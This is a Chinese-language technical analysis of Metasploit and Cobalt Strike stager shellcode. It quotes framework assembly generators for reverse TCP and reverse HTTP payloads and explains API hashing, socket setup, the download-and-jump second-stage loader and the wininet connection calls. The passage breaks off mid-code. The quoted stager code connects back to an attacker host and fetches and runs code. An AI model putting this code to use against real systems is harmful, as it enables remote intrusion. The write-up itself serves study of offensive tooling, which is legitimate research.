#### Metasploit & CobaltStrike 的shellcode分析
##### Metasploit & CobaltStrike
##### Reverse Tcp
  * 在generate_reverse_tcp中
        combined_asm = %Q^
          cld                    ; Clear the direction flag.
          call start             ; Call start, this pushes the address of 'api_call' onto the stack.
          #{asm_block_api}
          start:
            pop ebp
          #{asm_reverse_tcp(opts)}
          #{asm_block_recv(opts)}
        ^
**call start** 将asm_block_api地址push入栈，在start处，pop ebp，将 **asm_block_api**
地址取出，其功能就是通过函数名hash值，找到正确的函数地址并调用，所以接下来的函数调用基本都是以 **call ebp** 形式出现。
接下来 **asm_reverse_tcp(opts)** 处理
    reverse_tcp:
              push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
              push 'ws2_'             ; ...
              push esp                ; Push a pointer to the "ws2_32" string on the stack.
              push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
              mov eax, ebp
              call eax                ; LoadLibraryA( "ws2_32" )
              mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
              sub esp, eax            ; alloc some space for the WSAData structure
              push esp                ; push a pointer to this stuct
              push eax                ; push the wVersionRequested parameter
              push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
              call ebp                ; WSAStartup( 0x0190, &WSAData );
这一部分完成了WSAStartup(wVersionRequested, &WSAData)**
    set_address:
              push #{retry_count}     ; retry counter
            create_socket:
              push #{encoded_host}    ; host in little-endian format
              push #{encoded_port}    ; family AF_INET and port number
              mov esi, esp            ; save pointer to sockaddr struct
              push eax                ; if we succeed, eax will be zero, push zero for the flags param.
              push eax                ; push null for reserved parameter
              push eax                ; we do not specify a WSAPROTOCOL_INFO structure
              push eax                ; we do not specify a protocol
              inc eax                 ;
              push eax                ; push SOCK_STREAM
              inc eax                 ;
              push eax                ; push AF_INET
              push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
              call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
              xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
这里完成了建立Socket， **WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0)**
而且建立的socket值存于edi，这在第二阶段也会用到。
    # Check if a bind port was specified
          if opts[:bind_port]
            bind_port    = opts[:bind_port]
            encoded_bind_port = "0x%.8x" % [bind_port.to_i,2].pack("vn").unpack("N").first
            asm  socket
    "bind(s, &sockaddrin, 16)"
    recv(s, &size, 4);
    VirtuallAlloc(0, size, MEM_COMMIT, PAGE_EXEC_READWRITE)
    recv alldata
    jmp buffer
          其中buffer[0] = 0xBF, buffer[1] = socket
##### Reverse_HTTP
  * 主要过程在 **generate_reverse_http**
        def generate_reverse_http(opts={})
        combined_asm = %Q^
          cld                    ; Clear the direction flag.
          call start             ; Call start, this pushes the address of 'api_call' onto the stack.
          #{asm_block_api}
          start:
            pop ebp
          #{asm_reverse_http(opts)}
同样的结构，重点关注 **asm_reverse_http** 的实现
  * **asm_reverse_http**
免去一些设置HTTP Proxy的工作，直接看重点
        asm = %Q^
          ;-----------------------------------------------------------------------------;
          ; Compatible: Confirmed Windows 8.1, Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
          ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
          ;-----------------------------------------------------------------------------;
          ; Input: EBP must be the address of 'api_call'.
          ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
          load_wininet:
            push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
            push 0x696e6977        ; ...
            push esp               ; Push a pointer to the "wininet" string on the stack.
            push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
            call ebp               ; LoadLibraryA( "wininet" )
            xor ebx, ebx           ; Set ebx to NULL to use in future arguments
先加载wininet.dll
接下来布置参数，根据设置的HTTP的参数，调用 **InternetOpenA**
        asm << %Q^
        internetopen:
          push ebx               ; DWORD dwFlags
        ^
        if proxy_enabled
          asm << %Q^
            push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
          call get_proxy_server
            db "#{proxy_info}", 0x00
          get_proxy_server:
                                   ; LPCTSTR lpszProxyName (via call)
            push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
          ^
        else
          asm << %Q^
            push ebx               ; LPCTSTR lpszProxyBypass (NULL)
            push ebx               ; LPCTSTR lpszProxyName (NULL)
            push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
          ^
        end
        if opts[:ua].nil?
          asm << %Q^
            push ebx               ; LPCTSTR lpszAgent (NULL)
          ^
        else
          asm << %Q^
            push ebx               ; LPCTSTR lpszProxyBypass (NULL)
          call get_useragent
            db "#{opts[:ua]}", 0x00
                                   ; LPCTSTR lpszAgent (via call)
          get_useragent:
          ^
        end
        asm << %Q^
          push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
          call ebp
        ^
接下来
        asm << %Q^
          internetconnect:
            push ebx               ; DWORD_PTR dwContext (NULL)
            push ebx               ; dwFlags
            push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
            push ebx               ; password (NULL)
            push ebx               ; username (NULL)
            push #{opts[:port]}    ; PORT
            call got_server_uri    ; double call to get pointer for both server_uri and
          server_uri:              ; server_host; server_uri is saved in EDI for later
            db "#{opts[:url]}", 0x00
          got_server_host:
            push eax               ; HINTERNET hInternet (still in eax from InternetOpenA)
            push #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
            call ebp
            mov esi, eax           ; Store hConnection in esi
        ^
        ..........
            got_server_uri:
          pop edi                 //edi指向url
          call got_server_host
        server_host:              //将server_host入栈
          db "#{opts[:host]}", 0x00
        ^
这里有个在代码中插入字符串，并准确获得字符串指针的技巧，通过call + pop
最终执行了 **InternetConnectA(hInternet, server_host, port, NULL, NULL, 3, NULL,
NULL)**
接下来，根据代理配置设置代理
先设置username **InternetSetOptionA(hConnection, 43, username, length)**
    if proxy_enabled && proxy_user
            asm << %Q^
              ; DWORD dwBufferLength (length of username)
              push #{proxy_user.length}
              call set_proxy_username
            proxy_username:
              db "#{proxy_user}",0x00
            set_proxy_username:
                                   ; LPVOID lpBuffer (username from previous call)